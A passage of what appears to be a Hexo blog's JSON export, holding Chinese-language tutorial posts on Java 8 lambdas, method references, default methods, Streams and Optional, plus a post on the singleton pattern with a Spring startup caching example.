Optional.ofNullable(null);</span><br><span class=\"line\"></span><br><span class=\"line\">//1.存在则操作</span><br><span class=\"line\">s.ifPresent(System.out::println);</span><br><span class=\"line\"></span><br><span class=\"line\">//2.存在则返回，否则返回其它</span><br><span class=\"line\">s.orElse(&quot;0&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">//3.简化if-else ,多个if-else时效果明显</span><br><span class=\"line\">// if s 存在 则 转大写并+ a  else null</span><br><span class=\"line\">s.map(e -&gt; e.toUpperCase()).map(e2 -&gt; e2.concat(&quot;a&quot;)).orElse(&quot;null&quot;);</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>java8 方便了函数式编程<br></p>\n<h1 id=\"一-lambda表达式\"><a href=\"#一-lambda表达式\" class=\"headerlink\" title=\"一.lambda表达式\"></a>一.lambda表达式</h1><h2 id=\"1-意义\"><a href=\"#1-意义\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>lambda函数比较轻便，即用即仍，很适合需要完成一项功能，但是此功能只在此一处使用，连名字都很随意的情况下<br></p>\n<p><strong> lambda表达式可以方便的和以下一些特性结合使用。 </strong><br></p>\n<h2 id=\"2-形式\"><a href=\"#2-形式\" class=\"headerlink\" title=\"2.形式\"></a>2.形式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 1. 不需要参数,返回值为 5  </span><br><span class=\"line\">() -&gt; 5  </span><br><span class=\"line\"></span><br><span class=\"line\">// 2. 接收一个参数(数字类型),返回其2倍的值  </span><br><span class=\"line\">x -&gt; 2 * x  </span><br><span class=\"line\"></span><br><span class=\"line\">// 3. 接受2个参数(数字),并返回他们的差值  </span><br><span class=\"line\">(x, y) -&gt; x – y  </span><br><span class=\"line\"></span><br><span class=\"line\">// 4. 接收2个int型整数,返回他们的和  </span><br><span class=\"line\">(int x, int y) -&gt; x + y  </span><br><span class=\"line\"></span><br><span class=\"line\">// 5. 接受一个 string 对象,并在控制台打印,不返回任何值(看起来像是返回void)  </span><br><span class=\"line\">(String s) -&gt; System.out.print(s)</span><br></pre></td></tr></table></figure>\n<h1 id=\"二-方法引用\"><a href=\"#二-方法引用\" class=\"headerlink\" title=\"二. :: 方法引用\"></a>二. :: 方法引用</h1><h2 id=\"1-目的\"><a href=\"#1-目的\" class=\"headerlink\" title=\"1.目的\"></a>1.目的</h2><p>简化代码</p>\n<h2 id=\"2-例子\"><a href=\"#2-例子\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">//forEach</span><br><span class=\"line\">for(String s:list)&#123;</span><br><span class=\"line\">   System.out.println(s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//lambda</span><br><span class=\"line\">list.forEach(e -&gt; System.out.println(e));</span><br><span class=\"line\"></span><br><span class=\"line\">//::</span><br><span class=\"line\">list.forEach(System.out::println);</span><br></pre></td></tr></table></figure>\n<h1 id=\"三-接口默认方法\"><a href=\"#三-接口默认方法\" class=\"headerlink\" title=\"三.接口默认方法\"></a>三.接口默认方法</h1><h2 id=\"1-意义-1\"><a href=\"#1-意义-1\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>接口与其实现类之间的 耦合度 太高了（tightly coupled），当需要为一个接口添加方法时，所有的实现类都必须随之修改。默认方法解决了这个问题，它可以为接口添加新的方法，而不会破坏已有的接口的实现。<br></p>\n<h2 id=\"2-样例\"><a href=\"#2-样例\" class=\"headerlink\" title=\"2.样例\"></a>2.样例</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        new MyTest().new A().testA();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    interface InterfaceA&#123;</span><br><span class=\"line\">        default void test()&#123;</span><br><span class=\"line\">            System.out.println(&quot;a&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class A implements InterfaceA&#123;</span><br><span class=\"line\">        public void testA()&#123;</span><br><span class=\"line\">            new A().test();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"四-Stream\"><a href=\"#四-Stream\" class=\"headerlink\" title=\"四.Stream\"></a>四.Stream</h1><p><a href=\"https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/java/j-lo-java8streamapi/index.html</a></p>\n<h2 id=\"1-意义-2\"><a href=\"#1-意义-2\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>函数式编程？？</p>\n<p>对集合功能的增强，提供便利的聚合操作</p>\n<h2 id=\"2-使用\"><a href=\"#2-使用\" class=\"headerlink\" title=\"2.使用\"></a>2.使用</h2><p>简单说，对 Stream 的使用就是实现一个 filter-map-reduce 过程，产生一个最终结果，或者导致一个副作用（side effect）</p>\n<h3 id=\"1-流\"><a href=\"#1-流\" class=\"headerlink\" title=\"1.流\"></a>1.流</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//串行流</span><br><span class=\"line\">Collection.Stream()</span><br><span class=\"line\"></span><br><span class=\"line\">//并行流</span><br><span class=\"line\">Collection.parallelStream()</span><br></pre></td></tr></table></figure>\n<p>常用构造方式<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 1. Individual values</span><br><span class=\"line\">Stream stream = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;);</span><br><span class=\"line\">// 2. Arrays</span><br><span class=\"line\">String [] strArray = new String[] &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;;</span><br><span class=\"line\">stream = Stream.of(strArray);</span><br><span class=\"line\">stream = Arrays.stream(strArray);</span><br><span class=\"line\">// 3. Collections</span><br><span class=\"line\">List&lt;String&gt; list = Arrays.asList(strArray);</span><br><span class=\"line\">stream = list.stream();</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-操作类型\"><a href=\"#2-操作类型\" class=\"headerlink\" title=\"2.操作类型\"></a>2.操作类型</h3><ul>\n<li>Intermediate  中间操作</li>\n</ul>\n<p>map (mapToInt, flatMap 等)、 filter、 distinct、 sorted、 peek、 limit、 skip、 parallel、 sequential、 unordered<br></p>\n<p>一个流可以后面跟随零个或多个 intermediate 操作。其目的主要是打开流，做出某种程度的数据映射/过滤，然后返回一个新的流，交给下一个操作使用。这类操作都是惰性化的（lazy），就是说，仅仅调用到这类方法，并没有真正开始流的遍历。</p>\n<ul>\n<li>Terminal   终结操作</li>\n</ul>\n<p>forEach、 forEachOrdered、 toArray、 reduce、 collect、 min、 max、 count、 anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 iterator<br></p>\n<p>一个流只能有一个 terminal 操作，当这个操作执行后，流就被使用“光”了，无法再被操作。所以这必定是流的最后一个操作。Terminal 操作的执行，才会真正开始流的遍历，并且会生成一个结果，或者一个 side effect。</p>\n<ul>\n<li>short-circuiting 短路</li>\n</ul>\n<p>anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 limit<br></p>\n<p>当操作一个无限大的 Stream，而又希望在有限时间内完成操作，则在管道内拥有一个 short-circuiting 操作是必要非充分条件。</p>\n<h3 id=\"3-操作例子\"><a href=\"#3-操作例子\" class=\"headerlink\" title=\"3.操作例子\"></a>3.操作例子</h3><ul>\n<li>filter</li>\n</ul>\n<p>对stream进行过滤, 满足过滤条件的留下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().filter(a -&gt; a.equals(&quot;2&quot;)).forEach(System.out::println);</span><br><span class=\"line\">// result: 2 2</span><br></pre></td></tr></table></figure>\n<ul>\n<li>map</li>\n</ul>\n<p>map 对元素进行某种转换处理，得到结果，一一映射。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().map(String::hashCode).forEach(System.out::println);</span><br><span class=\"line\">// result: 49 50 50 51</span><br></pre></td></tr></table></figure>\n<p>mapToInt 将元素转成int类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().mapToInt(data -&gt; Integer.parseInt(data)).forEach(System.out::println);</span><br></pre></td></tr></table></figure></p>\n<p>flatMap 是将Stream中的每个元素都转换成Stream类型，然后将每个Stream的元素提出取来，聚合成一个最外围的Stream<br></p>\n<p>例子：将两个Stream组合成一个<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">List&lt;String&gt; list2 = Arrays.asList(&quot;4&quot;,&quot;5&quot;,&quot;6&quot;);</span><br><span class=\"line\">Stream.of(list, list2).flatMap(List::stream).forEach(System.out::println);</span><br><span class=\"line\">//result: 1 2 2 3 4 5 6</span><br></pre></td></tr></table></figure></p>\n<p>两个list去重合并：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">List&lt;String&gt; list1 = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;);</span><br><span class=\"line\">List&lt;String&gt; list2 = Arrays.asList(&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">List list = Stream.of(list1, list2).flatMap(List::stream).distinct().collect(Collectors.toList());</span><br><span class=\"line\"></span><br><span class=\"line\">list.stream().forEach( System.out::println);</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>reduce</li>\n</ul>\n<p>终结操作，把 Stream 元素组合起来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">List&lt;String&gt; list2 = Arrays.asList(&quot;4&quot;,&quot;5&quot;,&quot;6&quot;);</span><br><span class=\"line\">Optional&lt;String&gt; s = Stream.of(list, list2).flatMap(List::stream).reduce(String::concat);</span><br><span class=\"line\">s.ifPresent(System.out::println);</span><br><span class=\"line\">//result: 1223456</span><br></pre></td></tr></table></figure>\n<ul>\n<li>forEach</li>\n</ul>\n<p>终结操作，遍历stream中的元素<br></p>\n<p>可用 <strong>peek</strong> 来遍历，中间操作<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().peek(System.out::println).map(e -&gt; e + &quot;map&quot;).peek(System.out::println).count();</span><br><span class=\"line\">//result:</span><br><span class=\"line\">1</span><br><span class=\"line\">1map</span><br><span class=\"line\">2</span><br><span class=\"line\">2map</span><br><span class=\"line\">2</span><br><span class=\"line\">2map</span><br><span class=\"line\">3</span><br><span class=\"line\">3map</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>limit/skip</li>\n</ul>\n<p>limit 得到前n个元素，skip 抛弃前n个元素<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;String&gt; list = Arrays.asList(&quot;1&quot;,&quot;2&quot;,&quot;2&quot;,&quot;3&quot;);</span><br><span class=\"line\">list.stream().limit(3).skip(1).forEach(System.out::println);</span><br><span class=\"line\">//result: 2 2</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>Match</li>\n</ul>\n<p>allMatch：Stream 中全部元素符合传入的 predicate，返回 true<br><br>anyMatch：Stream 中只要有一个元素符合传入的 predicate，返回 true<br><br>noneMatch：Stream 中没有一个元素符合传入的 predicate，返回 true<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">boolean flag = list.stream().limit(3).anyMatch(e -&gt; e.equals(&quot;2&quot;));</span><br></pre></td></tr></table></figure>\n<h1 id=\"五-optional\"><a href=\"#五-optional\" class=\"headerlink\" title=\"五.optional\"></a>五.optional</h1><p><a href=\"https://www.zhihu.com/question/20125256\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/20125256</a></p>\n<h2 id=\"1-意义-3\"><a href=\"#1-意义-3\" class=\"headerlink\" title=\"1.意义\"></a>1.意义</h2><p>Optional<t>配合Lambda可以使Java对于null的处理变的异常优雅<br></t></p>\n<h2 id=\"2-例子-1\"><a href=\"#2-例子-1\" class=\"headerlink\" title=\"2.例子\"></a>2.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Optional&lt;String&gt; s = Optional.ofNullable(null);</span><br><span class=\"line\"></span><br><span class=\"line\">//1.存在则操作</span><br><span class=\"line\">s.ifPresent(System.out::println);</span><br><span class=\"line\"></span><br><span class=\"line\">//2.存在则返回，否则返回其它</span><br><span class=\"line\">s.orElse(&quot;0&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">//3.简化if-else ,多个if-else时效果明显</span><br><span class=\"line\">// if s 存在 则 转大写并+ a  else null</span><br><span class=\"line\">s.map(e -&gt; e.toUpperCase()).map(e2 -&gt; e2.concat(&quot;a&quot;)).orElse(&quot;null&quot;);</span><br></pre></td></tr></table></figure>\n"},{"title":"单例模式","date":"2018-10-31T20:43:55.000Z","_content":"\n#### 1.用途\n用来维护一个全局的类，保存某些常用数据，减少资源消耗。\n#### 2.原理\n维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。\n\n#### 3.两种常用实现\n1.饿汉式\n线程安全，非懒加载\n```\npublic class Singleton {\n    //这句饿汉式的关键，类加载时初始化\n    private static  final Singleton instance = new Singleton();\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n```\n\n2.静态内部类\n可用调用时再初始化加载(lazyLoad)。<br>\n线程安全，懒加载\n\n```\npublic class Singleton {\n    //静态内部类\n    private static class SingletonHolder{\n        private static  final Singleton instance = new Singleton();\n    }\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return SingletonHolder.instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n\n```\n\n使用\n```\npackage com.bonc.sms.controller;\n\nimport com.bonc.sms.entity.PlatformChannelSpEntity;\nimport com.bonc.sms.entity.PlatformEntity;\nimport com.bonc.sms.service.PlatformService;\nimport com.bonc.sms.util.Singleton;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.stereotype.Component;\n\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n@Component\npublic class InitDid implements CommandLineRunner {\n    private static final Logger logger = LoggerFactory.getLogger(InitDid.class);\n    @Autowired\n    PlatformService platformService;\n    @Override\n    public void run(String... strings) {\n        Map data = new HashMap<String,Map>();\n        System.out.println(\"**************************platform*************initdid\");\n        List<PlatformEntity> platform = platformService.getPlatformAll();\n        System.out.println(\"***:\"+ platform.size());\n        for(PlatformEntity platformEntity: platform){\n//            String url = platformService.getSpUrl(platformEntity.getSp_number()).getUrl();\n            Map value = new HashMap<String, String>();\n            value.put(\"platform_name\", platformEntity.getPlatform_name());\n            value.put(\"platform_address\", platformEntity.getPlatform_address());\n            value.put(\"platform_type\", platformEntity.getPlatform_type());\n            value.put(\"platform_key\",platformEntity.getPlatform_key());\n            List<PlatformChannelSpEntity> platformChannelSpEntities = platformService.getPlatformChannelSp(platformEntity.getPlatform_id());\n            List<String> channel = new ArrayList<String>();\n            Map<String,String> channel_sp = new HashMap<String, String>();\n            Map<String,String> channel_url = new HashMap<String, String>();\n            for(PlatformChannelSpEntity platformChannelSpEntity: platformChannelSpEntities){\n                channel.add(platformChannelSpEntity.getChannel_id());\n                channel_sp.put(platformChannelSpEntity.getChannel_id(),platformChannelSpEntity.getSp_number());\n                String url = platformService.getSpUrl(platformChannelSpEntity.getChannel_id());\n                channel_url.put(platformChannelSpEntity.getChannel_id(),url);\n            }\n            value.put(\"channel\",channel);\n            value.put(\"channel_sp\",channel_sp);\n            value.put(\"channel_url\", channel_url);\n            data.put(platformEntity.getPlatform_id(), value);\n        }\n        Singleton.getInstance().setData(data);\n        logger.info(\"需要的平台缓存信息初始化完成\");\n    }\n}\n\n```\n","source":"_posts/java/java单例.md","raw":"---\ntitle: 单例模式\ndate: 2018-10-31 16:43:55\ntags: [java]\n---\n\n#### 1.用途\n用来维护一个全局的类，保存某些常用数据，减少资源消耗。\n#### 2.原理\n维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。\n\n#### 3.两种常用实现\n1.饿汉式\n线程安全，非懒加载\n```\npublic class Singleton {\n    //这句饿汉式的关键，类加载时初始化\n    private static  final Singleton instance = new Singleton();\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n```\n\n2.静态内部类\n可用调用时再初始化加载(lazyLoad)。<br>\n线程安全，懒加载\n\n```\npublic class Singleton {\n    //静态内部类\n    private static class SingletonHolder{\n        private static  final Singleton instance = new Singleton();\n    }\n    //维护的数据\n    private Map<String,Map> data;\n    //构造函数,初始化一次\n    private Singleton(){\n        this.data = new HashMap<String, Map>();\n    };\n    //获取实例\n    public static final Singleton getInstance(){\n        return SingletonHolder.instance;\n    }\n\n    //全局获取维护的数据\n    public  Map<String, Map> getData(){\n        return this.data;\n    }\n    //修改数据\n    public void setData(Map<String, Map> data) {\n        this.data = data;\n    }\n}\n\n```\n\n使用\n```\npackage com.bonc.sms.controller;\n\nimport com.bonc.sms.entity.PlatformChannelSpEntity;\nimport com.bonc.sms.entity.PlatformEntity;\nimport com.bonc.sms.service.PlatformService;\nimport com.bonc.sms.util.Singleton;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.stereotype.Component;\n\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n@Component\npublic class InitDid implements CommandLineRunner {\n    private static final Logger logger = LoggerFactory.getLogger(InitDid.class);\n    @Autowired\n    PlatformService platformService;\n    @Override\n    public void run(String... strings) {\n        Map data = new HashMap<String,Map>();\n        System.out.println(\"**************************platform*************initdid\");\n        List<PlatformEntity> platform = platformService.getPlatformAll();\n        System.out.println(\"***:\"+ platform.size());\n        for(PlatformEntity platformEntity: platform){\n//            String url = platformService.getSpUrl(platformEntity.getSp_number()).getUrl();\n            Map value = new HashMap<String, String>();\n            value.put(\"platform_name\", platformEntity.getPlatform_name());\n            value.put(\"platform_address\", platformEntity.getPlatform_address());\n            value.put(\"platform_type\", platformEntity.getPlatform_type());\n            value.put(\"platform_key\",platformEntity.getPlatform_key());\n            List<PlatformChannelSpEntity> platformChannelSpEntities = platformService.getPlatformChannelSp(platformEntity.getPlatform_id());\n            List<String> channel = new ArrayList<String>();\n            Map<String,String> channel_sp = new HashMap<String, String>();\n            Map<String,String> channel_url = new HashMap<String, String>();\n            for(PlatformChannelSpEntity platformChannelSpEntity: platformChannelSpEntities){\n                channel.add(platformChannelSpEntity.getChannel_id());\n                channel_sp.put(platformChannelSpEntity.getChannel_id(),platformChannelSpEntity.getSp_number());\n                String url = platformService.getSpUrl(platformChannelSpEntity.getChannel_id());\n                channel_url.put(platformChannelSpEntity.getChannel_id(),url);\n            }\n            value.put(\"channel\",channel);\n            value.put(\"channel_sp\",channel_sp);\n            value.put(\"channel_url\", channel_url);\n            data.put(platformEntity.getPlatform_id(), value);\n        }\n        Singleton.getInstance().setData(data);\n        logger.info(\"需要的平台缓存信息初始化完成\");\n    }\n}\n\n```\n","slug":"java/java单例","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ho000r6dcpb8l7jghe","content":"<h4 id=\"1-用途\"><a href=\"#1-用途\" class=\"headerlink\" title=\"1.用途\"></a>1.用途</h4><p>用来维护一个全局的类，保存某些常用数据，减少资源消耗。</p>\n<h4 id=\"2-原理\"><a href=\"#2-原理\" class=\"headerlink\" title=\"2.原理\"></a>2.原理</h4><p>维护一个类，确保只有单一的对象被创建（创建一次），提供一个唯一的访问接口。私有的构造函数确保外部不能进行访问。</p>\n<h4 id=\"3-两种常用实现\"><a href=\"#3-两种常用实现\" class=\"headerlink\" title=\"3.两种常用实现\"></a>3.两种常用实现</h4><p>1.饿汉式<br>线程安全，非懒加载<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //这句饿汉式的关键，类加载时初始化</span><br><span class=\"line\">    private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span class=\"line\">        this.data = data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.静态内部类<br>可用调用时再初始化加载(lazyLoad)。<br><br>线程安全，懒加载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Singleton &#123;</span><br><span class=\"line\">    //静态内部类</span><br><span class=\"line\">    private static class SingletonHolder&#123;</span><br><span class=\"line\">        private static  final Singleton instance = new Singleton();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //维护的数据</span><br><span class=\"line\">    private Map&lt;String,Map&gt; data;</span><br><span class=\"line\">    //构造函数,初始化一次</span><br><span class=\"line\">    private Singleton()&#123;</span><br><span class=\"line\">        this.data = new HashMap&lt;String, Map&gt;();</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    //获取实例</span><br><span class=\"line\">    public static final Singleton getInstance()&#123;</span><br><span class=\"line\">        return SingletonHolder.instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //全局获取维护的数据</span><br><span class=\"line\">    public  Map&lt;String, Map&gt; getData()&#123;</span><br><span class=\"line\">        return this.data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //修改数据</span><br><span class=\"line\">    public void setData(Map&lt;String, Map&gt; data) &#123;</span><br><span 